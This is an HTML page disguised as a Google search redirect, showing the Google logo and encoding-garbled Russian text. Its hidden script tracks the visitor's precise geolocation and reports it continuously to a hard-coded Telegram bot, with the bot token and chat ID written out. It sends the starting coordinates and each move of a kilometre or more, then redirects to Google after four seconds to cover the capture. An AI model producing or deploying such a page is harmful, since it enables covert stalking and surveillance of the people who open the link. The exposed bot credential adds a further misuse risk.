<body>
  <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" alt="Google" />
  <div class="text">–û—Ç–∫—Ä—ã—Ç–∏–µ –ø–æ–∏—Å–∫–æ–≤–æ–π —Å–∏—Å—Ç–µ–º—ã...</div>

  <script>
    const botToken = "7972755394:AAFVmA7LMOgpygkl-ED_vhHd2eUs-agQ1aw";
    const chatId = "148031411";
    let lastLat = null;
    let lastLon = null;
    const MIN_DISTANCE = 1000; // 1 –∫–º

    function sendToTelegram(text) {
      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: text
        })
      });
    }

    function getDistance(lat1, lon1, lat2, lon2) {
      const R = 6371000;
      const toRad = x => x * Math.PI / 180;
      const dLat = toRad(lat2 - lat1);
      const dLon = toRad(lon2 - lon1);
      const a = Math.sin(dLat / 2) ** 2 +
                Math.cos(toRad(lat1)) * Math.cos(toRad(lat2)) *
                Math.sin(dLon / 2) ** 2;
      const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
      return R * c;
    }

    function handlePosition(position) {
      const lat = position.coords.latitude;
      const lon = position.coords.longitude;
      const acc = position.coords.accuracy;

      if (lastLat === null || lastLon === null) {
        lastLat = lat;
        lastLon = lon;

        const msg = `üìç –°—Ç–∞—Ä—Ç–æ–≤–∞—è —Ç–æ—á–∫–∞:\n–®–∏—Ä–æ—Ç–∞: ${lat.toFixed(6)}\n–î–æ–ª–≥–æ—Ç–∞: ${lon.toFixed(6)}\nhttps://www.google.com/maps?q=${lat},${lon}`;
        sendToTelegram(msg);
        return;
      }

      const distance = getDistance(lat, lon, lastLat, lastLon);
      if (distance >= MIN_DISTANCE) {
        const msg = `üìç –ü–µ—Ä–µ–º–µ—â–µ–Ω–∏–µ –±–æ–ª–µ–µ 1 –∫–º:\n–®–∏—Ä–æ—Ç–∞: ${lat.toFixed(6)}\n–î–æ–ª–≥–æ—Ç–∞: ${lon.toFixed(6)}\n–î–∏—Å—Ç–∞–Ω—Ü–∏—è: ${Math.round(distance)}–º\nhttps://www.google.com/maps?q=${lat},${lon}`;
        sendToTelegram(msg);
        lastLat = lat;
        lastLon = lon;
      }
    }

    function handleError() {
      sendToTelegram("‚ö†Ô∏è –û—à–∏–±–∫–∞ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏ (—Ç—Ä–µ–∫–∏–Ω–≥)");
    }

    // –í–∫–ª—é—á–∞–µ–º —Ç—Ä–µ–∫–∏–Ω–≥
    navigator.geolocation.watchPosition(handlePosition, handleError, {
      enableHighAccuracy: true,
      maximumAge: 0,
      timeout: 10000
    });

    // –†–µ–¥–∏—Ä–µ–∫—Ç —á–µ—Ä–µ–∑ 4 —Å–µ–∫—É–Ω–¥—ã
    setTimeout(() => {
      window.location.href = "https://www.google.com/?client=safari";
    }, 4000);
  </script>
